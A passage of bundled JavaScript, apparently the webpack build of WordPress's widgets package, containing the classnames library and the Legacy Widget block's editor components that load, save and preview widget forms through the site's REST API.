/******/ (() => { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 5755:
/***/ ((module, exports) => {

var __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;/*!
	Copyright (c) 2018 Jed Watson.
	Licensed under the MIT License (MIT), see
	http://jedwatson.github.io/classnames
*/
/* global define */

(function () {
	'use strict';

	var hasOwn = {}.hasOwnProperty;
	var nativeCodeString = '[native code]';

	function classNames() {
		var classes = [];

		for (var i = 0; i < arguments.length; i++) {
			var arg = arguments[i];
			if (!arg) continue;

			var argType = typeof arg;

			if (argType === 'string' || argType === 'number') {
				classes.push(arg);
			} else if (Array.isArray(arg)) {
				if (arg.length) {
					var inner = classNames.apply(null, arg);
					if (inner) {
						classes.push(inner);
					}
				}
			} else if (argType === 'object') {
				if (arg.toString !== Object.prototype.toString && !arg.toString.toString().includes('[native code]')) {
					classes.push(arg.toString());
					continue;
				}

				for (var key in arg) {
					if (hasOwn.call(arg, key) && arg[key]) {
						classes.push(key);
					}
				}
			}
		}

		return classes.join(' ');
	}

	if ( true && module.exports) {
		classNames.default = classNames;
		module.exports = classNames;
	} else if (true) {
		// register as 'classnames', consistent with npm package name
		!(__WEBPACK_AMD_DEFINE_ARRAY__ = [], __WEBPACK_AMD_DEFINE_RESULT__ = (function () {
			return classNames;
		}).apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__),
		__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
	} else {}
}());


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	(() => {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = (module) => {
/******/ 			var getter = module && module.__esModule ?
/******/ 				() => (module['default']) :
/******/ 				() => (module);
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry need to be wrapped in an IIFE because it need to be in strict mode.
(() => {
"use strict";
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  MoveToWidgetArea: () => (/* reexport */ MoveToWidgetArea),
  addWidgetIdToBlock: () => (/* reexport */ addWidgetIdToBlock),
  getWidgetIdFromBlock: () => (/* reexport */ getWidgetIdFromBlock),
  registerLegacyWidgetBlock: () => (/* binding */ registerLegacyWidgetBlock),
  registerLegacyWidgetVariations: () => (/* reexport */ registerLegacyWidgetVariations),
  registerWidgetGroupBlock: () => (/* binding */ registerWidgetGroupBlock)
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/index.js
var legacy_widget_namespaceObject = {};
__webpack_require__.r(legacy_widget_namespaceObject);
__webpack_require__.d(legacy_widget_namespaceObject, {
  metadata: () => (metadata),
  name: () => (legacy_widget_name),
  settings: () => (settings)
});

// NAMESPACE OBJECT: ./node_modules/@wordpress/widgets/build-module/blocks/widget-group/index.js
var widget_group_namespaceObject = {};
__webpack_require__.r(widget_group_namespaceObject);
__webpack_require__.d(widget_group_namespaceObject, {
  metadata: () => (widget_group_metadata),
  name: () => (widget_group_name),
  settings: () => (widget_group_settings)
});

;// CONCATENATED MODULE: external ["wp","blocks"]
const external_wp_blocks_namespaceObject = window["wp"]["blocks"];
;// CONCATENATED MODULE: external "React"
const external_React_namespaceObject = window["React"];
;// CONCATENATED MODULE: external ["wp","primitives"]
const external_wp_primitives_namespaceObject = window["wp"]["primitives"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/widget.js

/**
 * WordPress dependencies
 */

const widget = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M6 3H8V5H16V3H18V5C19.1046 5 20 5.89543 20 7V19C20 20.1046 19.1046 21 18 21H6C4.89543 21 4 20.1046 4 19V7C4 5.89543 4.89543 5 6 5V3ZM18 6.5H6C5.72386 6.5 5.5 6.72386 5.5 7V8H18.5V7C18.5 6.72386 18.2761 6.5 18 6.5ZM18.5 9.5H5.5V19C5.5 19.2761 5.72386 19.5 6 19.5H18C18.2761 19.5 18.5 19.2761 18.5 19V9.5ZM11 11H13V13H11V11ZM7 11V13H9V11H7ZM15 13V11H17V13H15Z"
}));
/* harmony default export */ const library_widget = (widget);

// EXTERNAL MODULE: ./node_modules/classnames/index.js
var classnames = __webpack_require__(5755);
var classnames_default = /*#__PURE__*/__webpack_require__.n(classnames);
;// CONCATENATED MODULE: external ["wp","blockEditor"]
const external_wp_blockEditor_namespaceObject = window["wp"]["blockEditor"];
;// CONCATENATED MODULE: external ["wp","components"]
const external_wp_components_namespaceObject = window["wp"]["components"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/brush.js

/**
 * WordPress dependencies
 */

const brush = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M4 20h8v-1.5H4V20zM18.9 3.5c-.6-.6-1.5-.6-2.1 0l-7.2 7.2c-.4-.1-.7 0-1.1.1-.5.2-1.5.7-1.9 2.2-.4 1.7-.8 2.2-1.1 2.7-.1.1-.2.3-.3.4l-.6 1.1H6c2 0 3.4-.4 4.7-1.4.8-.6 1.2-1.4 1.3-2.3 0-.3 0-.5-.1-.7L19 5.7c.5-.6.5-1.6-.1-2.2zM9.7 14.7c-.7.5-1.5.8-2.4 1 .2-.5.5-1.2.8-2.3.2-.6.4-1 .8-1.1.5-.1 1 .1 1.3.3.2.2.3.5.2.8 0 .3-.1.9-.7 1.3z"
}));
/* harmony default export */ const library_brush = (brush);

;// CONCATENATED MODULE: external ["wp","i18n"]
const external_wp_i18n_namespaceObject = window["wp"]["i18n"];
;// CONCATENATED MODULE: external ["wp","element"]
const external_wp_element_namespaceObject = window["wp"]["element"];
;// CONCATENATED MODULE: external ["wp","data"]
const external_wp_data_namespaceObject = window["wp"]["data"];
;// CONCATENATED MODULE: external ["wp","coreData"]
const external_wp_coreData_namespaceObject = window["wp"]["coreData"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/widget-type-selector.js

/**
 * WordPress dependencies
 */





function WidgetTypeSelector({
  selectedId,
  onSelect
}) {
  const widgetTypes = (0,external_wp_data_namespaceObject.useSelect)(select => {
    var _select$getSettings$w;
    const hiddenIds = (_select$getSettings$w = select(external_wp_blockEditor_namespaceObject.store).getSettings()?.widgetTypesToHideFromLegacyWidgetBlock) !== null && _select$getSettings$w !== void 0 ? _select$getSettings$w : [];
    return select(external_wp_coreData_namespaceObject.store).getWidgetTypes({
      per_page: -1
    })?.filter(widgetType => !hiddenIds.includes(widgetType.id));
  }, []);
  if (!widgetTypes) {
    return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Spinner, null);
  }
  if (widgetTypes.length === 0) {
    return (0,external_wp_i18n_namespaceObject.__)('There are no widgets available.');
  }
  return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.SelectControl, {
    __nextHasNoMarginBottom: true,
    label: (0,external_wp_i18n_namespaceObject.__)('Select a legacy widget to display:'),
    value: selectedId !== null && selectedId !== void 0 ? selectedId : '',
    options: [{
      value: '',
      label: (0,external_wp_i18n_namespaceObject.__)('Select widget')
    }, ...widgetTypes.map(widgetType => ({
      value: widgetType.id,
      label: widgetType.name
    }))],
    onChange: value => {
      if (value) {
        const selected = widgetTypes.find(widgetType => widgetType.id === value);
        onSelect({
          selectedId: selected.id,
          isMulti: selected.is_multi
        });
      } else {
        onSelect({
          selectedId: null
        });
      }
    }
  });
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/inspector-card.js

function InspectorCard({
  name,
  description
}) {
  return (0,external_React_namespaceObject.createElement)("div", {
    className: "wp-block-legacy-widget-inspector-card"
  }, (0,external_React_namespaceObject.createElement)("h3", {
    className: "wp-block-legacy-widget-inspector-card__name"
  }, name), (0,external_React_namespaceObject.createElement)("span", null, description));
}

;// CONCATENATED MODULE: external ["wp","notices"]
const external_wp_notices_namespaceObject = window["wp"]["notices"];
;// CONCATENATED MODULE: external ["wp","compose"]
const external_wp_compose_namespaceObject = window["wp"]["compose"];
;// CONCATENATED MODULE: external ["wp","apiFetch"]
const external_wp_apiFetch_namespaceObject = window["wp"]["apiFetch"];
var external_wp_apiFetch_default = /*#__PURE__*/__webpack_require__.n(external_wp_apiFetch_namespaceObject);
;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/control.js
/**
 * WordPress dependencies
 */




/**
 * An API for creating and loading a widget control (a <div class="widget">
 * element) that is compatible with most third party widget scripts. By not
 * using React for this, we ensure that we have complete contorl over the DOM
 * and do not accidentally remove any elements that a third party widget script
 * has attached an event listener to.
 *
 * @property {Element} element The control's DOM element.
 */
class Control {
  /**
   * Creates and loads a new control.
   *
   * @access public
   * @param {Object}   params
   * @param {string}   params.id
   * @param {string}   params.idBase
   * @param {Object}   params.instance
   * @param {Function} params.onChangeInstance
   * @param {Function} params.onChangeHasPreview
   * @param {Function} params.onError
   */
  constructor({
    id,
    idBase,
    instance,
    onChangeInstance,
    onChangeHasPreview,
    onError
  }) {
    this.id = id;
    this.idBase = idBase;
    this._instance = instance;
    this._hasPreview = null;
    this.onChangeInstance = onChangeInstance;
    this.onChangeHasPreview = onChangeHasPreview;
    this.onError = onError;

    // We can't use the real widget number as this is calculated by the
    // server and we may not ever *actually* save this widget. Instead, use
    // a fake but unique number.
    this.number = ++lastNumber;
    this.handleFormChange = (0,external_wp_compose_namespaceObject.debounce)(this.handleFormChange.bind(this), 200);
    this.handleFormSubmit = this.handleFormSubmit.bind(this);
    this.initDOM();
    this.bindEvents();
    this.loadContent();
  }

  /**
   * Clean up the control so that it can be garabge collected.
   *
   * @access public
   */
  destroy() {
    this.unbindEvents();
    this.element.remove();
    // TODO: How do we make third party widget scripts remove their event
    // listeners?
  }

  /**
   * Creates the control's DOM structure.
   *
   * @access private
   */
  initDOM() {
    var _this$id, _this$idBase;
    this.element = el('div', {
      class: 'widget open'
    }, [el('div', {
      class: 'widget-inside'
    }, [this.form = el('form', {
      class: 'form',
      method: 'post'
    }, [
    // These hidden form inputs are what most widgets' scripts
    // use to access data about the widget.
    el('input', {
      class: 'widget-id',
      type: 'hidden',
      name: 'widget-id',
      value: (_this$id = this.id) !== null && _this$id !== void 0 ? _this$id : `${this.idBase}-${this.number}`
    }), el('input', {
      class: 'id_base',
      type: 'hidden',
      name: 'id_base',
      value: (_this$idBase = this.idBase) !== null && _this$idBase !== void 0 ? _this$idBase : this.id
    }), el('input', {
      class: 'widget-width',
      type: 'hidden',
      name: 'widget-width',
      value: '250'
    }), el('input', {
      class: 'widget-height',
      type: 'hidden',
      name: 'widget-height',
      value: '200'
    }), el('input', {
      class: 'widget_number',
      type: 'hidden',
      name: 'widget_number',
      value: this.idBase ? this.number.toString() : ''
    }), this.content = el('div', {
      class: 'widget-content'
    }),
    // Non-multi widgets can be saved via a Save button.
    this.id && el('button', {
      class: 'button is-primary',
      type: 'submit'
    }, (0,external_wp_i18n_namespaceObject.__)('Save'))])])]);
  }

  /**
   * Adds the control's event listeners.
   *
   * @access private
   */
  bindEvents() {
    // Prefer jQuery 'change' event instead of the native 'change' event
    // because many widgets use jQuery's event bus to trigger an update.
    if (window.jQuery) {
      const {
        jQuery: $
      } = window;
      $(this.form).on('change', null, this.handleFormChange);
      $(this.form).on('input', null, this.handleFormChange);
      $(this.form).on('submit', this.handleFormSubmit);
    } else {
      this.form.addEventListener('change', this.handleFormChange);
      this.form.addEventListener('input', this.handleFormChange);
      this.form.addEventListener('submit', this.handleFormSubmit);
    }
  }

  /**
   * Removes the control's event listeners.
   *
   * @access private
   */
  unbindEvents() {
    if (window.jQuery) {
      const {
        jQuery: $
      } = window;
      $(this.form).off('change', null, this.handleFormChange);
      $(this.form).off('input', null, this.handleFormChange);
      $(this.form).off('submit', this.handleFormSubmit);
    } else {
      this.form.removeEventListener('change', this.handleFormChange);
      this.form.removeEventListener('input', this.handleFormChange);
      this.form.removeEventListener('submit', this.handleFormSubmit);
    }
  }

  /**
   * Fetches the widget's form HTML from the REST API and loads it into the
   * control's form.
   *
   * @access private
   */
  async loadContent() {
    try {
      if (this.id) {
        const {
          form
        } = await saveWidget(this.id);
        this.content.innerHTML = form;
      } else if (this.idBase) {
        const {
          form,
          preview
        } = await encodeWidget({
          idBase: this.idBase,
          instance: this.instance,
          number: this.number
        });
        this.content.innerHTML = form;
        this.hasPreview = !isEmptyHTML(preview);

        // If we don't have an instance, perform a save right away. This
        // happens when creating a new Legacy Widget block.
        if (!this.instance.hash) {
          const {
            instance
          } = await encodeWidget({
            idBase: this.idBase,
            instance: this.instance,
            number: this.number,
            formData: serializeForm(this.form)
          });
          this.instance = instance;
        }
      }

      // Trigger 'widget-added' when widget is ready. This event is what
      // widgets' scripts use to initialize, attach events, etc. The event
      // must be fired using jQuery's event bus as this is what widget
      // scripts expect. If jQuery is not loaded, do nothing - some
      // widgets will still work regardless.
      if (window.jQuery) {
        const {
          jQuery: $
        } = window;
        $(document).trigger('widget-added', [$(this.element)]);
      }
    } catch (error) {
      this.onError(error);
    }
  }

  /**
   * Perform a save when a multi widget's form is changed. Non-multi widgets
   * are saved manually.
   *
   * @access private
   */
  handleFormChange() {
    if (this.idBase) {
      this.saveForm();
    }
  }

  /**
   * Perform a save when the control's form is manually submitted.
   *
   * @access private
   * @param {Event} event
   */
  handleFormSubmit(event) {
    event.preventDefault();
    this.saveForm();
  }

  /**
   * Serialize the control's form, send it to the REST API, and update the
   * instance with the encoded instance that the REST API returns.
   *
   * @access private
   */
  async saveForm() {
    const formData = serializeForm(this.form);
    try {
      if (this.id) {
        const {
          form
        } = await saveWidget(this.id, formData);
        this.content.innerHTML = form;
        if (window.jQuery) {
          const {
            jQuery: $
          } = window;
          $(document).trigger('widget-updated', [$(this.element)]);
        }
      } else if (this.idBase) {
        const {
          instance,
          preview
        } = await encodeWidget({
          idBase: this.idBase,
          instance: this.instance,
          number: this.number,
          formData
        });
        this.instance = instance;
        this.hasPreview = !isEmptyHTML(preview);
      }
    } catch (error) {
      this.onError(error);
    }
  }

  /**
   * The widget's instance object.
   *
   * @access private
   */
  get instance() {
    return this._instance;
  }

  /**
   * The widget's instance object.
   *
   * @access private
   */
  set instance(instance) {
    if (this._instance !== instance) {
      this._instance = instance;
      this.onChangeInstance(instance);
    }
  }

  /**
   * Whether or not the widget can be previewed.
   *
   * @access public
   */
  get hasPreview() {
    return this._hasPreview;
  }

  /**
   * Whether or not the widget can be previewed.
   *
   * @access private
   */
  set hasPreview(hasPreview) {
    if (this._hasPreview !== hasPreview) {
      this._hasPreview = hasPreview;
      this.onChangeHasPreview(hasPreview);
    }
  }
}
let lastNumber = 0;
function el(tagName, attributes = {}, content = null) {
  const element = document.createElement(tagName);
  for (const [attribute, value] of Object.entries(attributes)) {
    element.setAttribute(attribute, value);
  }
  if (Array.isArray(content)) {
    for (const child of content) {
      if (child) {
        element.appendChild(child);
      }
    }
  } else if (typeof content === 'string') {
    element.innerText = content;
  }
  return element;
}
async function saveWidget(id, formData = null) {
  let widget;
  if (formData) {
    widget = await external_wp_apiFetch_default()({
      path: `/wp/v2/widgets/${id}?context=edit`,
      method: 'PUT',
      data: {
        form_data: formData
      }
    });
  } else {
    widget = await external_wp_apiFetch_default()({
      path: `/wp/v2/widgets/${id}?context=edit`,
      method: 'GET'
    });
  }
  return {
    form: widget.rendered_form
  };
}
async function encodeWidget({
  idBase,
  instance,
  number,
  formData = null
}) {
  const response = await external_wp_apiFetch_default()({
    path: `/wp/v2/widget-types/${idBase}/encode`,
    method: 'POST',
    data: {
      instance,
      number,
      form_data: formData
    }
  });
  return {
    instance: response.instance,
    form: response.form,
    preview: response.preview
  };
}
function isEmptyHTML(html) {
  const element = document.createElement('div');
  element.innerHTML = html;
  return isEmptyNode(element);
}
function isEmptyNode(node) {
  switch (node.nodeType) {
    case node.TEXT_NODE:
      // Text nodes are empty if it's entirely whitespace.
      return node.nodeValue.trim() === '';
    case node.ELEMENT_NODE:
      // Elements that are "embedded content" are not empty.
      // https://dev.w3.org/html5/spec-LC/content-models.html#embedded-content-0
      if (['AUDIO', 'CANVAS', 'EMBED', 'IFRAME', 'IMG', 'MATH', 'OBJECT', 'SVG', 'VIDEO'].includes(node.tagName)) {
        return false;
      }
      // Elements with no children are empty.
      if (!node.hasChildNodes()) {
        return true;
      }
      // Elements with children are empty if all their children are empty.
      return Array.from(node.childNodes).every(isEmptyNode);
    default:
      return true;
  }
}
function serializeForm(form) {
  return new window.URLSearchParams(Array.from(new window.FormData(form))).toString();
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/form.js

/**
 * External dependencies
 */

/**
 * WordPress dependencies
 */






/**
 * Internal dependencies
 */

function Form({
  title,
  isVisible,
  id,
  idBase,
  instance,
  isWide,
  onChangeInstance,
  onChangeHasPreview
}) {
  const ref = (0,external_wp_element_namespaceObject.useRef)();
  const isMediumLargeViewport = (0,external_wp_compose_namespaceObject.useViewportMatch)('small');

  // We only want to remount the control when the instance changes
  // *externally*. For example, if the user performs an undo. To do this, we
  // keep track of changes made to instance by the control itself and then
  // ignore those.
  const outgoingInstances = (0,external_wp_element_namespaceObject.useRef)(new Set());
  const incomingInstances = (0,external_wp_element_namespaceObject.useRef)(new Set());
  const {
    createNotice
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_notices_namespaceObject.store);
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    if (incomingInstances.current.has(instance)) {
      incomingInstances.current.delete(instance);
      return;
    }
    const control = new Control({
      id,
      idBase,
      instance,
      onChangeInstance(nextInstance) {
        outgoingInstances.current.add(instance);
        incomingInstances.current.add(nextInstance);
        onChangeInstance(nextInstance);
      },
      onChangeHasPreview,
      onError(error) {
        window.console.error(error);
        createNotice('error', (0,external_wp_i18n_namespaceObject.sprintf)( /* translators: %s: the name of the affected block. */
        (0,external_wp_i18n_namespaceObject.__)('The "%s" block was affected by errors and may not function properly. Check the developer tools for more details.'), idBase || id));
      }
    });
    ref.current.appendChild(control.element);
    return () => {
      if (outgoingInstances.current.has(instance)) {
        outgoingInstances.current.delete(instance);
        return;
      }
      control.destroy();
    };
  }, [id, idBase, instance, onChangeInstance, onChangeHasPreview, isMediumLargeViewport]);
  if (isWide && isMediumLargeViewport) {
    return (0,external_React_namespaceObject.createElement)("div", {
      className: classnames_default()({
        'wp-block-legacy-widget__container': isVisible
      })
    }, isVisible && (0,external_React_namespaceObject.createElement)("h3", {
      className: "wp-block-legacy-widget__edit-form-title"
    }, title), (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
      focusOnMount: false,
      placement: "right",
      offset: 32,
      resize: false,
      flip: false,
      shift: true
    }, (0,external_React_namespaceObject.createElement)("div", {
      ref: ref,
      className: "wp-block-legacy-widget__edit-form",
      hidden: !isVisible
    })));
  }
  return (0,external_React_namespaceObject.createElement)("div", {
    ref: ref,
    className: "wp-block-legacy-widget__edit-form",
    hidden: !isVisible
  }, (0,external_React_namespaceObject.createElement)("h3", {
    className: "wp-block-legacy-widget__edit-form-title"
  }, title));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/preview.js

/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */





function Preview({
  idBase,
  instance,
  isVisible
}) {
  const [isLoaded, setIsLoaded] = (0,external_wp_element_namespaceObject.useState)(false);
  const [srcDoc, setSrcDoc] = (0,external_wp_element_namespaceObject.useState)('');
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    const abortController = typeof window.AbortController === 'undefined' ? undefined : new window.AbortController();
    async function fetchPreviewHTML() {
      const restRoute = `/wp/v2/widget-types/${idBase}/render`;
      return await external_wp_apiFetch_default()({
        path: restRoute,
        method: 'POST',
        signal: abortController?.signal,
        data: instance ? {
          instance
        } : {}
      });
    }
    fetchPreviewHTML().then(response => {
      setSrcDoc(response.preview);
    }).catch(error => {
      if ('AbortError' === error.name) {
        // We don't want to log aborted requests.
        return;
      }
      throw error;
    });
    return () => abortController?.abort();
  }, [idBase, instance]);

  // Resize the iframe on either the load event, or when the iframe becomes visible.
  const ref = (0,external_wp_compose_namespaceObject.useRefEffect)(iframe => {
    // Only set height if the iframe is loaded,
    // or it will grow to an unexpected large height in Safari if it's hidden initially.
    if (!isLoaded) {
      return;
    }
    // If the preview frame has another origin then this won't work.
    // One possible solution is to add custom script to call `postMessage` in the preview frame.
    // Or, better yet, we migrate away from iframe.
    function setHeight() {
      var _iframe$contentDocume, _iframe$contentDocume2;
      // Pick the maximum of these two values to account for margin collapsing.
      const height = Math.max((_iframe$contentDocume = iframe.contentDocument.documentElement?.offsetHeight) !== null && _iframe$contentDocume !== void 0 ? _iframe$contentDocume : 0, (_iframe$contentDocume2 = iframe.contentDocument.body?.offsetHeight) !== null && _iframe$contentDocume2 !== void 0 ? _iframe$contentDocume2 : 0);

      // Fallback to a height of 100px if the height cannot be determined.
      // This ensures the block is still selectable. 100px should hopefully
      // be not so big that it's annoying, and not so small that nothing
      // can be seen.
      iframe.style.height = `${height !== 0 ? height : 100}px`;
    }
    const {
      IntersectionObserver
    } = iframe.ownerDocument.defaultView;

    // Observe for intersections that might cause a change in the height of
    // the iframe, e.g. a Widget Area becoming expanded.
    const intersectionObserver = new IntersectionObserver(([entry]) => {
      if (entry.isIntersecting) {
        setHeight();
      }
    }, {
      threshold: 1
    });
    intersectionObserver.observe(iframe);
    iframe.addEventListener('load', setHeight);
    return () => {
      intersectionObserver.disconnect();
      iframe.removeEventListener('load', setHeight);
    };
  }, [isLoaded]);
  return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, isVisible && !isLoaded && (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, null, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Spinner, null)), (0,external_React_namespaceObject.createElement)("div", {
    className: classnames_default()('wp-block-legacy-widget__edit-preview', {
      'is-offscreen': !isVisible || !isLoaded
    })
  }, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Disabled, null, (0,external_React_namespaceObject.createElement)("iframe", {
    ref: ref,
    className: "wp-block-legacy-widget__edit-preview-iframe",
    tabIndex: "-1",
    title: (0,external_wp_i18n_namespaceObject.__)('Legacy Widget Preview'),
    srcDoc: srcDoc,
    onLoad: event => {
      // To hide the scrollbars of the preview frame for some edge cases,
      // such as negative margins in the Gallery Legacy Widget.
      // It can't be scrolled anyway.
      // TODO: Ideally, this should be fixed in core.
      event.target.contentDocument.body.style.overflow = 'hidden';
      setIsLoaded(true);
    },
    height: 100
  }))));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/no-preview.js

/**
 * WordPress dependencies
 */

function NoPreview({
  name
}) {
  return (0,external_React_namespaceObject.createElement)("div", {
    className: "wp-block-legacy-widget__edit-no-preview"
  }, name && (0,external_React_namespaceObject.createElement)("h3", null, name), (0,external_React_namespaceObject.createElement)("p", null, (0,external_wp_i18n_namespaceObject.__)('No preview available.')));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/convert-to-blocks-button.js

/**
 * WordPress dependencies
 */





function ConvertToBlocksButton({
  clientId,
  rawInstance
}) {
  const {
    replaceBlocks
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_blockEditor_namespaceObject.store);
  return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.ToolbarButton, {
    onClick: () => {
      if (rawInstance.title) {
        replaceBlocks(clientId, [(0,external_wp_blocks_namespaceObject.createBlock)('core/heading', {
          content: rawInstance.title
        }), ...(0,external_wp_blocks_namespaceObject.rawHandler)({
          HTML: rawInstance.text
        })]);
      } else {
        replaceBlocks(clientId, (0,external_wp_blocks_namespaceObject.rawHandler)({
          HTML: rawInstance.text
        }));
      }
    }
  }, (0,external_wp_i18n_namespaceObject.__)('Convert to blocks'));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/widgets/build-module/blocks/legacy-widget/edit/index.js

/**
 * External dependencies
 */


/**
 * WordPress dependencies
 */








/**
 * Internal dependencies
 */






function Edit(props) {
  const {
    id,
    idBase
  } = props.attributes;
  const {
    isWide = false
  } = props;
  const blockProps = (0,external_wp_blockEditor_namespaceObject.useBlockProps)({
    className: classnames_default()({
      'is-wide-widget': isWide
    })
  });
  return (0,external_React_namespaceObject.createElement)("div", {
    ...blockProps
  }, !id && !idBase ? (0,external_React_namespaceObject.createElement)(Empty, {
    ...props
  }) : (0,external_React_namespaceObject.createElement)(NotEmpty, {
    ...props
  }));
}
function Empty({
  attributes: {
    id,
    idBase
  },
  setAttributes
}) {
  return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, {
    icon: (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockIcon, {
      icon: library_brush
    }),
    label: (0,external_wp_i18n_namespaceObject.__)('Legacy Widget')
  }, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Flex, null, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.FlexBlock, null, (0,external_React_namespaceObject.createElement)(WidgetTypeSelector, {
    selectedId: id !== null && id !== void 0 ? id : idBase,
    onSelect: ({
      selectedId,
      isMulti
    }) => {
      if (!selectedId) {
        setAttributes({
          id: null,
          idBase: null,
          instance: null
        });
      } else if (isMulti) {
        setAttributes({
          id: null,
          idBase: selectedId,
          instance: {}
        });
      } else {
        setAttributes({
          id: selectedId,
          idBase: null,
          instance: null
        });
      }
    }
  }))));
}
function NotEmpty({
  attributes: {
    id,
    idBase,
    instance
  },
  setAttributes,
  clientId,
  isSelected,
  isWide = false
}) {
  const [hasPreview, setHasPreview] = (0,external_wp_element_namespaceObject.useState)(null);
  const widgetTypeId = id !== null && id !== void 0 ? id : idBase;
  const {
    record: widgetType,
    hasResolved: hasResolvedWidgetType
  } = (0,external_wp_coreData_namespaceObject.useEntityRecord)('root', 'widgetType', widgetTypeId);
  const isNavigationMode = (0,external_wp_data_namespaceObject.useSelect)(select => select(external_wp_blockEditor_namespaceObject.store).isNavigationMode(), []);
  const setInstance = (0,external_wp_element_namespaceObject.useCallback)(nextInstance => {
    setAttributes({
      instance: nextInstance
    });
  }, []);
  if (!widgetType && hasResolvedWidgetType) {
    return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, {
      icon: (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockIcon, {
        icon: library_brush
      }),
      label: (0,external_wp_i18n_namespaceObject.__)('Legacy Widget')
    }, (0,external_wp_i18n_namespaceObject.__)('Widget is missing.'));
  }
  if (!hasResolvedWidgetType) {
    return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Placeholder, null, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Spinner, null));
  }
  const mode = idBase && (isNavigationMode || !isSelected) ? 'preview' : 'edit';
  return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, idBase === 'text' && (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.BlockControls, {
    group: "other"
  }, (0,external_React_namespaceObject.createElement)(ConvertToBlocksButton, {
    clientId: clientId,
    rawInstance: instance.raw
